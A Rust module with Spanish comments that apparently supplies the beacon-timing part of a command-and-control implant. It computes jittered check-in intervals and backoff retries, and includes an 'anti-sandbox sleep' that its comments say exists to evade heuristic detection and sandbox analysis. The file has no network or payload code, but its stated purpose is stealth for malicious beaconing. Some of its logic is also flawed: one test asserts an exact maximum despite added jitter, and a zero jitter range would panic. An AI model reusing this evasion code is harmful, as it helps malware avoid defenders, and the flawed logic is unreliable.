// Módulo de comunicación tipo beacon con jitter
// Implementa patrones de comunicación modernos para evadir detección heurística

use std::time::{Duration, SystemTime};
use std::thread;

/// Configuración de beacon
#[derive(Clone, Debug)]
pub struct BeaconConfig {
    /// Intervalo base de beacon en segundos
    pub interval: u64,
    /// Porcentaje de jitter (0-100)
    pub jitter_percent: u32,
    /// Tiempo máximo de espera en reconexión (segundos)
    pub max_retry_interval: u64,
    /// Intervalo inicial de retry (segundos)
    pub initial_retry_interval: u64,
}

impl Default for BeaconConfig {
    fn default() -> Self {
        Self {
            interval: 60,              // 60 segundos por defecto
            jitter_percent: 30,        // 30% de jitter
            max_retry_interval: 600,   // Máximo 10 minutos
            initial_retry_interval: 10, // Empezar con 10 segundos
        }
    }
}

impl BeaconConfig {
    /// Crea una configuración desde string "interval:jitter"
    /// Ejemplo: "60:30" = 60 segundos con 30% jitter
    pub fn from_str(s: &str) -> Option<Self> {
        let parts: Vec<&str> = s.split(':').collect();
        if parts.len() != 2 {
            return None;
        }
        
        let interval = parts[0].parse::<u64>().ok()?;
        let jitter = parts[1].parse::<u32>().ok()?;
        
        if jitter > 100 {
            return None;
        }
        
        Some(Self {
            interval,
            jitter_percent: jitter,
            ..Default::default()
        })
    }
}

/// Calcula el siguiente intervalo de beacon con jitter
pub fn calculate_beacon_interval(config: &BeaconConfig) -> Duration {
    // Generar jitter pseudo-aleatorio usando SystemTime
    let now = SystemTime::now()
        .duration_since(SystemTime::UNIX_EPOCH)
        .unwrap()
        .as_millis();
    
    // Usar los últimos dígitos del timestamp como seed
    let seed = (now % 10000) as i64;
    
    // Calcular jitter: ±jitter_percent% del intervalo
    let jitter_range = (config.interval * config.jitter_percent as u64) / 100;
    let jitter = (seed % (jitter_range as i64 * 2)) - jitter_range as i64;
    
    // Intervalo final = base + jitter (asegurar que sea positivo)
    let final_interval = if jitter < 0 {
        config.interval.saturating_sub((-jitter) as u64)
    } else {
        config.interval + jitter as u64
    };
    
    // Mínimo 5 segundos para evitar problemas
    let final_interval = final_interval.max(5);
    
    Duration::from_secs(final_interval)
}

/// Calcula el intervalo de retry con exponential backoff
pub fn calculate_retry_interval(
    config: &BeaconConfig,
    retry_count: u32,
) -> Duration {
    // Exponential backoff: initial * 2^retry_count
    let backoff = config.initial_retry_interval * 2u64.pow(retry_count.min(10));
    
    // Limitar al máximo configurado
    let interval = backoff.min(config.max_retry_interval);
    
    // Agregar jitter para evitar patrones
    let now = SystemTime::now()
        .duration_since(SystemTime::UNIX_EPOCH)
        .unwrap()
        .as_millis();
    let seed = (now % 1000) as u64;
    let jitter = seed % (interval / 4); // ±25% jitter
    
    Duration::from_secs(interval + jitter)
}

/// Duerme con el intervalo calculado, dividido en chunks para permitir interrupciones
pub fn beacon_sleep(duration: Duration) {
    // Dividir el sleep en chunks de 1 segundo para permitir
    // interrupciones más rápidas si es necesario en el futuro
    let total_secs = duration.as_secs();
    
    println!("DEBUG: [BEACON] Durmiendo {} segundos...", total_secs);
    
    // Dormir en chunks de 5 segundos
    let chunks = total_secs / 5;
    let remainder = total_secs % 5;
    
    for _ in 0..chunks {
        thread::sleep(Duration::from_secs(5));
    }
    
    if remainder > 0 {
        thread::sleep(Duration::from_secs(remainder));
    }
}

/// Implementa un sleep anti-sandbox
/// Algunos sandbox detectan sleeps largos y los aceleran
/// Esta función duerme en intervalos pequeños aleatorios
pub fn anti_sandbox_sleep(total_seconds: u64) {
    println!("DEBUG: [BEACON] Anti-sandbox sleep de {} segundos", total_seconds);
    
    let mut remaining = total_seconds;
    
    while remaining > 0 {
        // Chunks aleatorios entre 1-5 segundos
        let now = SystemTime::now()
            .duration_since(SystemTime::UNIX_EPOCH)
            .unwrap()
            .as_millis();
        let chunk_size = 1 + ((now % 5) as u64);
        let chunk = chunk_size.min(remaining);
        
        thread::sleep(Duration::from_secs(chunk));
        remaining -= chunk;
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    
    #[test]
    fn test_beacon_config_from_str() {
        let config = BeaconConfig::from_str("120:40").unwrap();
        assert_eq!(config.interval, 120);
        assert_eq!(config.jitter_percent, 40);
        
        // Invalid formats
        assert!(BeaconConfig::from_str("invalid").is_none());
        assert!(BeaconConfig::from_str("60:150").is_none()); // jitter > 100
    }
    
    #[test]
    fn test_calculate_beacon_interval() {
        let config = BeaconConfig {
            interval: 60,
            jitter_percent: 30,
            ..Default::default()
        };
        
        // El intervalo debe estar entre 42-78 segundos (60 ±30%)
        let interval = calculate_beacon_interval(&config);
        let secs = interval.as_secs();
        assert!(secs >= 42 && secs <= 78, "Interval was {} seconds", secs);
    }
    
    #[test]
    fn test_calculate_retry_interval() {
        let config = BeaconConfig::default();
        
        // Primera retry: 10 segundos
        let interval1 = calculate_retry_interval(&config, 0);
        assert!(interval1.as_secs() >= 10 && interval1.as_secs() <= 13);
        
        // Segunda retry: 20 segundos
        let interval2 = calculate_retry_interval(&config, 1);
        assert!(interval2.as_secs() >= 20 && interval2.as_secs() <= 25);
        
        // Debe llegar al máximo
        let interval_max = calculate_retry_interval(&config, 20);
        assert_eq!(interval_max.as_secs(), config.max_retry_interval);
    }
}
